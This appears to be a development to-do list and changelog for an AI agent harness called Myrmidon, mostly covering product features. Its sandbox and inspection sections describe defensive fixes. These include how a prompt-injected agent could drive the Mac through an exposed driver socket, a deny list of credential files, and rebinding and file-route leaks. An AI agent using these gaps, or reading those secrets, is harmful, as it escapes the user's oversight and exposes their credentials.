      - [x] Mark spoken messages in the chat (they carry `voice: true`). Already shown ("Said on a call"); tests added.
      - [x] Phone calls (Twilio Media Streams into the same pipeline), as OpenClaw does. Done 2026-10-09 with fakes
        (docs/voice.md "Phone calls"). Left: try a real call (needs the SMS number, a public https URL); the stream
        handshake signature URL is unverified; switching off does not restore the number's old webhook; no lead/crew
        choice by phone.
      - [x] Phonon's streaming endpoint (`/v1/audio/stream`) for partial transcripts, to answer sooner. Live words
        in the call bar; final 25–180 ms sooner. Replying from a partial was not done (partials miss hotwords).
      - [x] Phonon `--hotwords` from agent and project names (per request; `--hotwords` is not a server flag).
      - [x] Phonon servers left running by earlier runs (8 found) are stopped before a new one starts.
      - [x] Realtime speech-to-speech models (OpenAI Realtime, Gemini Live) as another call mode. **Not now
        (decided 2026-10-09).**
12b. - [x] **Smart chat names** (asked 2026-10-08) — done: after a round the lead's model names the chat from what it
      is about (Open WebUI's task-model pattern); "hi" has nothing to name, so it tries again after rounds 2 and 3.
      Names given by the person, a channel or a schedule are kept (`chat/renamed` now says `by: 'auto'` for ours).
      Settings → You & mascot → Chat names: from the topic, or the first message.
12c. - [x] **No pop-up on every answer** (asked 2026-10-08) — done: the "… is done" toast is skipped for the chat on
      screen in a focused window; it still shows for other chats and other views, and the desktop notice when away.
12d. - [x] **Telegram media** (asked 2026-10-08) — done: voice notes failed because omp picked a local Whisper it
      cannot call ("Unsupported transcription API: local-inference"); channel voice notes now go to the voice engine
      chosen in Settings → Voice while voice is on (Phonon-2 reads Telegram's OGG/Opus as is), and omp's fallback
      only picks models it can call. A photo without a caption failed with "message is empty": files alone are now a
      message. Stickers: a still one comes as its WebP image with its emoji, an animated one as its emoji.
      Not yet checked against the real Telegram (needs a message sent to the bot).
12e. - [x] **Flaky under load: LINE sender name, Feishu credentials check** — channels-line "events become messages…" saw "Someone" for
      "Alice" once in a full run while other sessions ran their suites (the profile lookup is not awaited in time);
      passes alone.
      Also channels-feishu "check() names the bot…" once (Feishu refused this App ID…) in a full run; passes alone.
      Fixed 2026-10-09: fakes listened on both IPv4 and IPv6 while adapters dialled 127.0.0.1, so a port Chrome held
      on 127.0.0.1 could answer instead; fakes now bind 127.0.0.1, and tests wait for what they check. 7,680 loaded
      runs clean. Left: voice-call "approvals one at a time" hung once under heavy load (passes 78/78 alone).
12f. - [x] **Mail tab counts unread only** (asked 2026-10-08): a mailbox's count is what the person has not read; it
      drops as they read a conversation and rises when new messages arrive. Done: last seq seen per conversation, kept
      in the browser; checked live (99+ → 21 after opening two conversations).
12h. - [x] **No process outlives Myrmidon** (asked 2026-10-09: "we should not have such issues") — 8 Phonon servers and
      6 Chromes were found orphaned. Done: a leash (own process group, stops the tree when Myrmidon's pipe closes) for
      Phonon, agents' dev servers, Chrome (watched by pid: puppeteer's pipe mode crashed Bun on macOS, EXC_GUARD) and
      the desktop app's server; Kitten already exits on EOF; terminal shells get SIGHUP. SIGKILL tests for each.
      Left: Linux not run; MCP servers that ignore stdin EOF would leak (none seen).
      - [x] The Kitten worker likely fails in the packaged desktop app (it runs kitten-worker.ts, not on disk in
        the compiled sidecar) — check and bundle it. Worse: voice on crashed the packaged server, and onnxruntime's
        library and the warm-up clip were missing too. Fixed and checked in a compiled build.
      - [x] Kitten's model download has no timeout (done: quiet deadline for Kitten, the speech detector and the turn model): a stuck connection (seen: IPv6 SYN_SENT to the CDN) hangs it.
12i. - [x] **First-run setup assistant** (asked 2026-10-09) — nine skippable screens with a live mascot, resumable,
      "Run setup again" in Settings → General. Done. Not checked live: the mic level meter, the local voice download,
      sending a starter prompt, notification bodies, the hand-off animation in a normal window.
12j. - [x] **Remove a single model from a provider** (asked 2026-10-09). Done.
12k. - [x] **Select several chats and delete them at once** (asked 2026-10-09). Done.
12m. - [x] **The sandbox lets agents read your files** (done: home reads blocked with an allow-list; extra reads per Settings, project and chat via request_read) (asked 2026-10-09) — today it only blocks writes: home, ~/.zshrc and
      other chats are readable and the network is open, so "sandboxed" vs "full access" barely differ. Block reads of the
      home folder except scratch, shared files, toolchains, the current chat; make the difference plain in Settings.
12n. - [x] **Setup: "Finish setting up" can't be dismissed** (done) — must dismiss for good; redoing one step (e.g. voice) must not
      walk through the next steps again; the test notification does nothing.
12o. - [x] **Mascot shows what you type** — on the new-chat screen the matrix shows the typed text with a blinking bar; after
      5 s without typing the eyes come back. Done: letters drawn in the eye grid's own cells (5 tall), only the last ones
      that fit, no scrolling, a blinking cursor bar; their colour follows the draft's mood like the eyes.
12p. - [x] **Agent feedback report** (done; its test plugin removed, its files and tools left in the probe chat by the person's choice) (docs/research/2026-10-09-agent-feedback.md): multi-file artifact pages fail from file://
      (serve over http); crewmate briefs wrong ("solo", tools they lack, two finishing rules); made tools not callable until
      find_tools; find_tools silently drops tools; read_log shows only the first line; repeated prompt text, irrelevant
      skills, tool names differing between prompt and tool list, reviewer not mentioned, mixed time zones.
12q. - [x] **Prompts rewritten** (done, merged 2c176a1; left: eval A/B, learned rules, failure counts per family, descriptions from transcripts) — study omp, Qwen Code, Hermes (and others) harness prompts, document them in docs/research,
      then rewrite Myrmidon's prompts to that standard.
      The person: match the best of the other harnesses; nothing static — assembled from guarded sections per role, live
      tool list, model family, run state and environment; and evolving — learned rules from runs and feedback, prompt
      versions logged per run, A/B checked with apps/eval before shipping.
      Research done (docs/research/2026-10-09-harness-prompts.md, Part 4 is the plan; assembled prompts in
      docs/research/2026-10-09-myrmidon-prompts-assembled.md). Also found: the chat title still reaches agents through
      the colony id (a slug of the title) in scratch paths, $MYR_MIRROR and artifact: URLs; 65 of 139 tool parameters
      undocumented; the judge never told its threshold.
12r. - [x] **Computer use** (asked 2026-10-09) — done: Cua Driver embedded as an MCP server; one app at a time once
      approved, like Claude Code; Settings → Computer use (off by default). Untested live: Esc to stop; Gemini uses the
      generic tool.
12s. - [x] **The mascot comes alive** (done, merged 7966d27) (asked 2026-10-09) — on the same 15x8 dot screen: idle animations (eye roll, squint,
      sweep, yawn, sneeze, side-eye, peek, bored, cross-eyed); reactions drawn in dots (stars, spirals, ! ?, tears, sweat,
      fire, ZZZ); screen shows (boot scanline, confetti on a finished run, Pac-Man, Game of Life asleep, voice equaliser);
      interactive (click to look with a ripple, drag with squash-stretch, double-click sneeze, hold to charge and pop).
      Clicking it again and again confuses it: swirling eyes, every crew cursor falls with gravity and slowly recovers.
      Crew cursors get their own mechanics (Reynolds steering: wander, arrive, flee, separation; personalities),
      react to the eyes, and are named after random Minions.
12t. - [x] **One permission model: global, project, chat** (asked 2026-10-09: "I cannot keep approving tool calls, mcp
      calls etc; the ui should be well thought out", like Claude Code and Codex) — today approvals are spread over
      Settings → Tools rules, project modes, chat grants (file/command only) and full access; MCP has no per-chat or
      per-project allow and approval cards have no "don't ask again for this tool/server". Also: a team lead has no web, browser, shell or
      file tools (hard-coded in patterns.ts) and nothing lets the person change it; the lead then told the person the
      team had no browser. Decided: presets + rules, cards once/chat/project/everywhere, Auto default, hands-on lead
      by default with a role x tool-group control. Building on branch `permissions`.
12u. - [x] **Voice providers from Models & providers** (done, merged f3188ec; untested with real keys) (asked 2026-10-09) — any cloud STT/TTS and realtime
      (speech-to-speech) provider, configured in Settings → Models & providers like LLM providers, after Pipecat and
      similar repos; Settings → Voice picks among the configured ones and links to Models & providers to add more.
      Today: Phonon/Kitten locally, omp, or one OpenAI-compatible endpoint with keys in voice/secrets.json.
12v. - [x] **Themes like VS Code, and more mascot settings** (done, merged) (asked 2026-10-09) — the themes developers love
      (research which), applied to the whole UI; more ways to tune the mascot.
12w. - [x] **Search in Settings, like iPhone Settings** (done, merged 2526819; on main via #12) (asked 2026-10-09: "settings is not searchable and very
      confusing to find an option") — a search field at the top of Settings; every setting indexed with its page,
      section, label, help text and synonyms ("dark mode" → Theme, "api key" → Models & providers, "mic" → Voice);
      results as rows with a breadcrumb (Voice › Speech to text), keyboard first (⌘F / ⌘K, arrows, Enter); choosing one
      opens its page, scrolls to it and highlights it briefly. Built after the voice and themes branches merge.
      Never out of date (asked 2026-10-10): one settings registry is the single source — each entry declares id,
      page, section, label, help, keywords and its control — and the Settings pages render their rows from it, so
      search reads the same data the screen shows. Guards: (1) a DOM test renders every page and fails on any control
      without a registry id, or any registry entry that no page renders; (2) a test fails when a key in the runtime
      settings schema (settings.ts) has no registry entry or an explicit "not shown" mark; (3) dynamic rows (providers,
      models, MCP servers, plugins, specialists, channels) are indexed from live data through the same registry hook;
      (4) a short rule in CLAUDE.md/AGENTS.md: add a setting by adding a registry entry. Then tidy the page groups.
12x. - [ ] **Works properly on macOS, Linux and Windows** (asked 2026-10-10: "the software should work properly on
      all platforms") — x64 and arm64; web app, CLI and desktop app. CI: GitHub Actions matrix (macos, ubuntu,
      windows) runs typecheck and the full suite on every PR to main and push to develop. Windows sandbox: commands
      run inside WSL2 with bubblewrap when available, otherwise every command asks and Settings says why. Start
      from the cross-platform audit; fix blockers first.
      - [x] Windows pass 1 (`xp-windows-core`, merged 2026-10-10): sqlite handles, file-tool paths, rounds stall,
        worktrees, POSIX paths in settings, shell path, data folder, separators in text, terminal foreground,
        server.json after kill, process-tree tests.
      - [ ] Windows bugs parked 2026-10-10 ("stop windows mark the bug in todo and solve it later"), each a
        `pendingOn('win32', …)` gap in tests/platform.ts and docs/ci.md:
        - `walSidecarOnWindows`: a WAL database copied without `-wal`/`-shm` must read without SQLite creating
          them; the immutable-first open (fd07371) never ran on Windows CI.
        - `ptyTerminalOnWindows`: the PowerShell answer never comes back through pi-natives' ConPTY session.
        - `bunWindowsSockets`: Bun heap corruption on TCP close (1.3.14 and 1.4.3); report upstream, then upgrade.
        - Command timeout on Windows is only half fixed: `run()` returns at the timeout, but grandchildren Git
          Bash hands off through an exited parent (e.g. `sleep 30`) are not linked by parent PID and outlive the
          stop. Needs a Job Object per command.
12y. - [x] **omp features Myrmidon lacks** (asked 2026-10-10; reuse omp's modules where they fit):
      1. Long-term memory engine: extraction from chats, recall / reflect / edit (omp hindsight, mnemopi). Done
         2026-10-10 (memory.ts, memory-review.ts): prompts carry every kept memory while they fit, then the newest
         preferences and the most relevant (BM25, freshness, MMR) with `recall` for the rest; a cheap model suggests
         memories from what the person said after a round (quoting them, never secrets) and merges for repeats or
         stale ones (Tidy up, or daily when two overlap); agents correct one with remember's `replaces`; all wait for
         the person. Left: embeddings (lexical recall misses synonyms); memory for channel members' rounds.
      2. Debugger for agents over the Debug Adapter Protocol (omp dap). Done: the debug tool (debugger.ts).
      3. Live session sharing: another person joins a chat live (omp collab). Done: Share live… in a chat's menu
         makes a one-time invite (watch, or watch and write); guests see only that chat's conversation, write
         under their name with every outside step asking the person, and can be removed (chat-shares.ts).
      4. Autoresearch: an experiment loop on its own branch, measured and kept or dropped (omp autoresearch). Done:
         the `autoresearch` tool (start, trial, finish, status) with `experiment/*` events in the log.
      5. SSH remote hosts agents can work on (omp ssh). Done: Settings → Tools → Remote hosts, the `ssh` tool,
         `ssh-host` rules and the Remote hosts group.
      6. Telemetry export over OTLP (omp telemetry-export-otlp); plus a security-scan tool (omp security-scan). Done:
         the OTLP export (Settings → General → Telemetry export) and security_scan (secrets by omp's credential
         shapes, dependencies by OSV.dev).
12z. - [ ] **Contain the omp dependency** (asked 2026-10-10: "we are heavily dependent on omp and omp keeps updating")
      — pinned exactly today (18.8.7; 18.8.8 out), but 33 files outside packages/runtime/src/omp/ import omp, ~20 of
      them omp internals (session stores, computer supervisor, eval worker, marketplace fetcher…). Do, after the 12y
      branches and xp-windows-core merge: (1) one boundary — every @oh-my-pi import through packages/runtime/src/omp/
      with our own names/types, and a lint check that fails on @oh-my-pi imports elsewhere; (2) contract tests on that
      boundary for each omp area we use; (3) a weekly CI job that bumps omp on a branch, runs the 3-OS suite and opens
      a PR with omp's changelog; (4) vendor small internal pieces (MIT, with provenance); (5) list internals to ask
      upstream to export.
12l. - [x] **Full access, no sandbox** (asked 2026-10-09, like Hermes) — global switch in Settings → Tools (default on)
      and a per-project Full access; lifts the command sandbox, file-path limits and the private-address rule; approvals
      still apply; channel members and read-only projects stay sandboxed. Left: Windows (unconfined commands still use
      /bin/sh and the leash uses ps); a small DNS-rebinding window for other chats' tabs while a full-access chat shares
      the browser.
12g. - [x] **Status dots like Codex and Claude Code** (asked 2026-10-08): study how both show an agent's or session's
      state (working, waiting on you, done, failed, idle: colour, pulse, shape) and use that standard for every
      status dot in the app. Done: only work spins; amber means needs you; blue marks a chat finished while you were
      elsewhere until you open it; hollow ring done/idle, dashed queued, square stopped, × failed (ui/status.ts).
      Not done: a "2 need input" count in the window title, and putting needs-input chats first in the sidebar.
13. - [x] **Native UI phase 3+** — overlays, context menus, sheets, Settings as System Settings (spec
      2026-10-07-native-ui). Done 2026-10-09: sheets replace modals, context menus, ⌘K command menu, ⌘/ shortcuts,
      calm new chat, composer pop-ups, Settings like System Settings, old token names gone. Left: legacy.css clean-out,
      Reveal in Finder (needs the desktop shell).
14. - [x] **Agents' browser and private addresses** — decide a rule (e.g. only ports the round opened) and DNS-pinned
      fetching in omp to close rebinding (69456b5 notes). **Decided 2026-10-09: only ports the run opened; DNS-pinned.**
      Done 2026-10-09 (web_fetch and the browser). Left: the shell can still reach private addresses (sandbox limits
      writes only); the shared Chrome lets every open run's own ports through for WebSockets and service workers.
      web_fetch's readers back 2026-10-10 (web.ts readerSpawn): yt-dlp (YouTube details and transcripts) runs with
      every connection through the guard proxy and --ignore-config; trafilatura and lynx get the page on stdin,
      fetched pinned, so they make no requests; only omp's own options, a timeout, nothing installed during a read;
      missing ones fall back and say what to install. Left: a reader that ignores its proxy, or a program yt-dlp
      starts itself (a JS runtime), would reach the network unchecked; lynx's -stdin path untested on a real lynx.
15. - [x] **Look over in the browser** — Settings → Plugins page and the rewind confirmation sheet. Done 2026-10-09
      on a throwaway project: Plugins renders (placeholder cut at narrow widths); rewind sheet, Rewind files, Undo rewind
      and the Git panel refresh all work. Found and fixed on the way: the folder picker let a slow home listing replace
      a typed path; proposed files weren't covered by "Allow all file changes"; a run interrupted by a restart left
      its approval card with live buttons.
16. - [ ] **M4.7 benchmarks** (deferred).

Earlier items:


- [x] **Take what fits from CopilotKit/OpenDots** — researched (MIT); SSRF gap fixed (69456b5); the rest is listed
      above as their own items (3-5, 9-12).

- [x] **Rewind only undoes the round's own files** (done) — rewinding the crew round that edited Myrmidon restored the whole
      project snapshot and rolled back unrelated, newer commits (5d75622's files). Restore only files the round
      changed; ask before overwriting files changed after it.
- [x] **Plugins, like DeepSeek Harness** (phases 1-3 done; phase 4 is item 2 above: folders, Claude Code parts, Settings → Plugins, server code with ctx, UI slots; next: phase 4, agents build plugins) — ~/.myrmidon/plugins/<name>/ with plugin.json;
      contributes tools, skills, hooks, prompt sections, settings, UI in defined slots; hot reload; Settings →
      Plugins; agents asked for a Myrmidon feature build a plugin with create_plugin instead of patching source (Myrmidon
      will ship compiled, so plugins are the only way to extend it).

- [x] **Interactive agent questions + ask before building** (done) (approved design): `ask_user` takes 1-4 questions
      (header, 2-4 options with descriptions, single/multi select); the chat shows option cards with "Other…" for a
      custom answer and Skip ("use your judgment"), one Send answers all; the round waits. The lead asks scoping
      questions with ask_user before building when the request leaves real choices open (audience, style, stack,
      scope), not when it is specific or the person says "just do it"; check_in only for small mid-work preferences.
      Answers reach the agent as "Question → Answer" lines, skipped ones marked. Starts after the strings/prompts
      refactor merges (same files: tools.ts, patterns.ts → prompts.ts, RoundView.tsx).

- [x] **One place for strings, config and UI decisions** (5d75622, 4e37220: copy.ts, tokens.css, ui-config.ts; prompts.ts, config.ts) — move user-facing copy to a single strings file, and
      tunable config + colours/UI decisions to single files, so wording and look are easy to edit later.

- [x] **Thinking time + thinking transcripts** ("Thought for 7s" above the reply; live clock) — the person reports the thinking timer not working and the model's
      thinking not visible (check the new one-on-one chat view's clock and where thinking text shows).

- [x] **Chat first, colony on demand** (2809593) — a message should get a plain chat reply, not a colony run card every
      time. The lead decides later to spin up a colony (a tool it calls) or the person opts in (an option). Needs a
      short design before building (extends lead-first steps 2-3: streamed reply, quiet helpers).
- [x] **Rename "colony" in the UI** (5c6f10f: "crew") — the person finds it boring; offer name options with the chat-first design.

- [x] **Light-mode status colours pop** (2f7f30b) — red/yellow/green look dull in light mode (dark mode is fine); use
      Apple's light system colours (systemRed/Orange/Green) for `--bad`, `--warn`, `--ok` and their soft fills.

- [x] **One colony per chat** — follow-ups are rounds of the chat's colony (`round/started` in its log): agents keep
      their conversation, files keep their versions; tasks, plan, budgets and snapshots are per round. Older chats
      with a colony per round still read, and their next round continues the latest colony.
- [x] **A livelier start for a new chat** — the wait was ~7s of a static card: every message re-probed each model
      with a test call before starting. Probes are now cached for 15 min (wait ~3s, the triage call), and the card
      ticks off its steps with a running clock and a progress sweep.
- [x] **Should all tools be MCP?** No: Claude Code, omp and Codex keep built-ins native and use MCP for outside
      services. Taken instead: tools load on demand (omp's essential/discoverable split) — browser, dev server,
      tool making, MCP and made tools stay out of model calls until find_tools loads them or the request plainly
      needs them; ~5.5k → ~2.8k tokens of tool definitions per call. Serving colony tools over MCP (so outside
      harnesses can join) is open for later.
- [x] **Model providers cannot be removed** (423c0e7: on/off switch for providers whose keys live elsewhere) (reported 2026-10-07) — removing a provider in Settings → Models does not
      work; reproduce and fix.
- [x] **Respect each model's context window; redesign the model-error card** (f902329, 51fb148, 3d4fac3) (reported 2026-10-07) — switching a long
      chat's lead to Apple's on-device model (8K window) sent its whole 125K-token history and failed; the error card
      shows the raw provider message and offers a retry that cannot help.
- [x] **Talk to one lead; helpers appear only when needed** (lead-first step 1 + chat-first 2809593; streaming is its own item) (asked 2026-10-07) — sending a message should feel like
      talking to a single lead agent. Simple tasks stay with that one agent; for bigger ones the lead brings in more
      agents as the work calls for it. Drop "picking the right team" and anything that puts workers in the person's face
      up front; make it feel intuitive and intelligent.
- [x] **Web UI crash** ("q/U is not a function", window goes black) — Chrome 152's scrollIntoView returns a Promise,
      and the agent terminal's effect returned it (`useEffect(() => el.scrollIntoView())`); React called it as a cleanup
      on unmount and tore the whole tree down. Effects now have block bodies, and a test fails on any that does not.
      Found with `bun run dev`, which prints the browser's errors with component names.
- [x] **Collapsible terminal tabs and task tabs** — each agent command and each task folds (newest/running commands
      and active tasks start open), with Expand all / Collapse all, like the Git view.
- [x] **Design fixes** (ui-ux-pro-max audit; web-artifacts-builder's anti-slop rules) — AA contrast for muted and
      status text in both themes, stronger control borders, an 11px floor for tiny text, hover-only actions visible
      on touch, reduced-motion for pulsing animations, a dark-mode bubble instead of a white slab, one result card
      per round (verdict, files, changes), and a phone layout (no rail, view picker, panel starts closed).
- [x] **Replay the agent's computer** (2a81043) — a timeline scrubber in the Computer view: keyframes per
      browser action (screenshot + cursor + highlight, stored as blobs and logged), step back through what an
      agent did, "jump to live".
- [x] **Computer view for non-browser work** (e919d1a) — show the agent's terminal and the file it is editing live in the
      same panel when it is not browsing (Manus shows the terminal/editor too).
- [x] **Smarter harness prompts** (9440c44: craft + delivery contract, lead brief template, date/env, thinking
      levels, tool when/when-not, `working` doc, stop-with-task reminder; A/B measured) — agents (even Opus 5.5) act dumb in Myrmidon. Study the system prompts, tool
      descriptions and agent docs of strong harnesses (omp's own prompts in node_modules, Claude Code, Codex,
      OpenHands, Aider) and rewrite ours: role briefs, tool descriptions with when/when-not and examples,
      planning and verification habits, how to read the snapshot, how to use the board/notes/mail well.
      Update the harness docs (`packages/runtime/docs/*.md`) agents read via `read_docs` to match.
      Measure before/after with the eval prompts.
- [x] **Slash commands and omp's controls** (a9abbe1: /plan /steer /queue /stop /resume /retry /new /rename /mode /model /thinking /team /attach /export /mcp /settings /help; plan mode; thinking setting. model switch mid-round: `/model` or POST /api/chats/:id/model, logged as agent/model. compaction: near the model's window, older messages are summarized for the model (pi's generateSummary, folded forward), the log keeps everything. checkpoints/rewind: project rounds are snapshotted at start and end in a shadow git repo (the project's own git untouched); each round shows its changes with a diff, Rewind restores the folder, Undo reverts that) — slash commands in the composer (/plan, /model, /team, /mode,
      /stop, /retry, /resume, /thinking, /attach, /clear …) with an autocomplete menu; plan mode (show the plan
      for approve/edit before an expensive team round); per-agent thinking level; other omp session controls
      worth copying (compaction, checkpoints/rewind, model switch mid-chat). Agents learn them from the docs.
- [x] **Real browser for agents** (0980c14: puppeteer-core + system Chrome, browser_* tools, artifact: URLs) — proper web access: rendered pages, clicking,
      forms, screenshots, JS-heavy sites, and dev features for web apps the colony builds (open the built
      page, read console/network errors, run checks, screenshot for the judge). Research options first:
      Playwright, omp's built-in browser relay, browser-use, Stagehand, chrome-devtools MCP.
      First look (2026-10-06): Playwright's accessibility-snapshot model is the agent-friendly default (text-only,
      fast, cross-browser; Playwright MCP is built on it); Chrome DevTools MCP is better for debugging (console,
      network, Web Vitals, traces). Plan: playwright-core in-process (TS, no Python), snapshot/click/type/eval
      tools, plus CDP for console/network; live view via CDP Page.startScreencast frames over the existing
      websocket, takeover by forwarding mouse/keyboard (Input.dispatch*).
- [x] **Watch and take over the agent's browser** (28ad606, 7e12c96: Computer view, live screencast, agent cursor + element highlight, take control/hand back, full screen, IDE-style workspace bar) — when an agent browses, the person can see the live page
      in the UI (screencast), follow what the agent clicks, and take control (pause the agent, drive it, hand
      back), like Claude's browser pane.
- [x] **Workers persist across a chat's messages** — later rounds reuse the same workers (names, specialties,
      models, and their transcripts) instead of spawning new ones; the lead keeps or dismisses workers
      (`dismiss_worker`), and spawns new ones when needed.
- [x] **Swarm negotiates before executing** — on a new request every peer wakes, discovers the others
      (list_agents, roster), and they agree on the plan and who does what (proposals on the board/notes,
      claim by agreement) before anyone starts work. No single seed executing straight away.
- [x] **Mail view** — a Mail tab showing the agent-to-agent conversation (mail/sent, board posts, @mentions),
      threaded by participants.
- [x] **Show agents' thinking** — "Thought" rows in the run card expand to the full reasoning (the agent sheet and
      colony console already showed it). Live token streaming is not logged, so it appears per step.
- [x] **Send feedback in a new chat** — optimistic user bubble + PendingRound with the mascot thinking.
- [x] **Idle faces go to sleep** — agent avatars doze (closed eyes + drifting "z") after 15s idle.
- [x] **Claude via subscription sign-in (from omp)** — omp's own claude.ai OAuth (provider `anthropic`), now
      a "Sign in with a subscription" card in Settings → Keys & providers (Claude, ChatGPT, Gemini, Copilot…).
      Your stored Claude login expired 2026-09-01 (refresh token invalid), so sign in again there.
- [x] **Steer vs queue for messages to a running colony** — Steer/Queue toggle in the composer while a round
      runs (Alt+Enter sends the other way); steer joins the agent's next step, queue waits until it finishes.
- [x] **Read receipts for messages sent mid-run** — "Read by lead" under the bubble once the agent actually
      ingests it; the run card sits below the latest mid-run message.
- [x] **Attach files as context** — paperclip / drop / paste in the composer; files become `uploads/…` artifacts,
      the agent is told to read them, images reach vision models through read_artifact.
- [x] **Markdown artifacts** — Rendered / Source tabs and "Copy markdown" in the artifact viewer.
- [x] **MCP support** (b28de8d, 871c787) — let colonies use MCP servers (stdio/HTTP) as tools: config in Settings (import from
      omp's mcp.json), tool discovery, per-server enable, sandbox/approval rules, docs for agents.

- [x] **Resume after a shutdown or stop** — when the server restarts or a round is stopped, continue from
      where it was (re-create agents from the log, restore tasks/claims/notes/plan, re-deliver pending
      inbox items) instead of marking the round stopped. Explicit "Resume" action in the UI.
- [x] **Agents create their own tools** — `create_tool` (script + typed inputs, sandboxed, must pass a test run)
      → `tool_<name>` for the colony, carried into later rounds; "Keep" in the Files view adds it to the library
      (`<home>/tools`), which every new round loads; library in Settings → Tools.
- [x] **Eval harness** (`bun run eval`, apps/eval): six cases across the pillars (answer, build, research, coding in
      a fixture project, browser) with code-based checks plus the colony judge; trials → pass@k / pass^k and
      medians; JSON reports, `--compare`; exits 1 on tier mismatch or budget breach. First run (DeepSeek V4 Pro):
      3/3 pass, but reading one page heading took 132s and 11 tool calls on the solo tier.
- [x] **Fast path for small browser tasks** — answer tier gets a read-only browser (open + snapshot) and triage
      routes "open X and tell me Y" there; the judge sees what agents observed and is told its memory may be stale
      (it had failed a correct answer from memory). Eval `browser-heading`: 132s → 9s, 98k → 6k tokens.
- [x] Observer counts tool calls as progress (no stall warnings mid-research).
- [x] Per-round token budget (`budget.tokens`) and, for chat rounds, spend and token limits in Settings → Team &
      budget; at 80% agents are told to wrap up, at 100% the round stops.
- [x] Chat index (`<home>/chat-index.sqlite`): the list re-reads only logs whose files changed (53 colonies:
      16–21ms per poll → ~1ms); full folds only for the chat being acted on.
- [x] Harden the timing-sensitive tests: five tests waited on wall-clock (a 1s stall tick that ignored `quietMs`,
      and an 8s quiet wait after `ask_user`); the round now pauses as soon as a question is open and everyone is
      idle. Suite 52s → 18s, passes 3× in parallel.
- [x] **Terminal and Git views in the workspace** — Terminal: your own login shell in the project folder (Bun PTY +
      xterm.js; the socket only opens for the dashboard's own origin), kept alive across tabs; the agents' sandboxed
      commands moved to "Agent commands". Git (project chats): branch, ahead/behind, uncommitted changes with diffs,
      history with each commit's diff — read-only. Answer-tier agents in a project can now read its files.
- [x] **Workspace bar always visible** — the right icon rail stays on screen even when the panel is closed;
      clicking an icon opens that view's panel, and the panel has a close button that collapses back to the rail.
- [x] **Git view, advanced** — collapsible Uncommitted changes and History sections; VS Code Source Control
      (staged / unstaged / untracked groups, file tree, inline diff) meets GitLab (commit graph-like history with
      authors and dates, commit detail with file tree + side-by-side or unified diff, stats).
- [x] **Slash menu redesign** — a command palette: Recent + grouped commands (Round / Team & model / Chat / App) with
      icon tiles and current values, fuzzy match with highlighted letters, commands that can't run now dimmed with
      the reason, and omp-style argument completion (/model lists models, /mode and /thinking their choices, current
      one checked); ↑↓ ↵ Tab Esc with a hint footer.

## Project files (2026-10-09)

- [x] **See, open and re-read a file an agent edits** — edits never showed: no step for `fs_edit`/`fs_write`, an
      allowed edit shrank to one line with its diff gone, the Files view listed only published artifacts, nothing
      could open a project file, and a rewound run hid its diff. Now: an "Edited calc.py" step (after it went
      through) that expands to the change and opens the file; an allowed edit expands to what was allowed; Files
      lists "Changed in <project>"; a viewer opens a file as it is now (`GET /api/projects/:id/file`, contained to
      the folder, text only, 2 MB cap); a rewound run keeps View diff, with Open on each file.
- [x] **File browser like VS Code's Explorer** (the person's ask) — an Explorer view in project chats: the folder as
      a tree, one level loaded per folder opened (`GET /api/projects/:id/tree`), git status letters, folders with
      changes tinted, ignored entries dimmed, files the crew changed in this chat ringed, a name filter across the
      folder (`/find`, skipping what git ignores), arrow keys as in an editor, files open in the viewer. Refreshes on
      a rewind or commit and when the crew changes a file.

## Inspection of 68 commits (2026-10-09, evening)

Setup assistant, mascot, computer use, sandbox reads and full access, crew wind-down, schedules, prompts. All of it
is on main too (PR #8). Branch `inspection-fixes`; each group below is one agent's branch, reviewed, then merged.
Two other branches are rewriting the same runtime files (`permissions`, `prompts-rewrite`): the runtime fixes here
stay small so they merge cleanly into either.

### A — Sandbox and computer use (`sandbox.ts`, `config.ts`, `computer/driver.ts`, `computer/tool.ts`)
- [x] Sandboxed shells can `connect()` to the Cua Driver socket in the data folder (file-read deny does not cover
      sockets): a prompt-injected agent could run its own driver against it and drive the Mac with no app approval.
      Deny outbound unix sockets under the data folder (SBPL and bwrap).
- [x] Sandboxed commands likely inherit Myrmidon's Screen Recording / Accessibility grants (`screencapture`,
      CGEventPost): deny what the profile can (e.g. screencapture, osascript) or document the limit.
- [x] Stop / Esc only stops rounds holding an app; one waiting for the app (or on its approval card) takes it after.
- [x] Script Editor, Automator, Shortcuts (and Tor Browser) get full control with no warning: add them to the right
      tiers; cmd+R in a script app is a sensitive key.
- [x] `type` with a newline bypasses the "Return sends" check; Mail's shift+cmd+D send is not a sensitive key.
- [x] SANDBOX_SECRETS gaps once home reads are on: ~/.omp/agent, ~/.claude, ~/.codex, ~/.gemini, shell startup files,
      .terraform.d, .vault-token, .pgpass, .gem/credentials, .m2/settings.xml, Library/Containers and Group
      Containers; ~/.dotnet (a toolchain dir) holds a certificate store.
- [x] Outside home, /Volumes, /Users/Shared, /private/var/folders and /tmp/myr-* stay readable.
- [x] Unpinned fallback drivers (CUA_DRIVER_PATHS) run with the full environment and Myrmidon's grants.
- [ ] [decide] Sandboxed binaries can probably use the Accessibility API under Myrmidon's grant (untestable here: no
      grant).
- Sandboxed commands no longer reach the clipboard (pasteboard services denied): a project test that copies and
  pastes fails in the sandbox; builds, git, package managers and test runners are unaffected.

### B — Crew wind-down (`colony.ts`, `chat.ts`, `agent.ts`, `tools.ts` messaging, `tests/chat.test.ts`)
- [x] A person's follow-up while a round settles goes into the closing round and can go unanswered ("Not sent: this
      conversation is closing", turn cut, completed). Their message must cancel settling (or start a new round).
- [x] An answer given while settling skips the reviewer.
- [x] A team lead's final answer in plain text never reaches the person: the round waits for the stall nudge (~10s,
      two extra model turns). Deliver it as in a solo round.
- [x] Each sign-off sends one more model request that is then aborted (billed; aborted message in history).
- [x] chat.test.ts: 78 pass / 10 fail (was 86 / 1): rounds wait SETTLE_QUIET_MS after the answer, tests never set
      quietMs, and rounds still settling crash after teardown (`this.store.home`, "no such colony").
- [x] `create_group` sends without the one-last-word check; requeued non-mail notes lose `quiet` and their trigger.
- [x] The lead tells the person "This is a solo round" (brief wording leaking into replies).
- [x] Misplaced JSDoc in prompts.ts (`missed` above `windDown`).

### G — Dev servers (`tools.ts` start_server, `colony.ts` servers)
- [x] colony.test "only ports a run's own servers opened … ports already in use cannot be claimed" fails on develop:
      a port already in use is claimed (`ok: true`).
- [x] A server started under Full access keeps running unsandboxed after full access is taken back.

### C — Routes and project files (`devices.ts`, `projects.ts`, `server.ts` routes, `mcp.ts`, `ProjectExplorer.tsx`, `StepRow.tsx`)
- [x] `GET /api/projects/:id/file|tree|find` are open to chats-only devices and `readProjectFile` ignores
      SANDBOX_SECRETS: a paired phone reads `.env` (or `~/.ssh/...` in a project at home). (My bug, from the file
      viewer.)
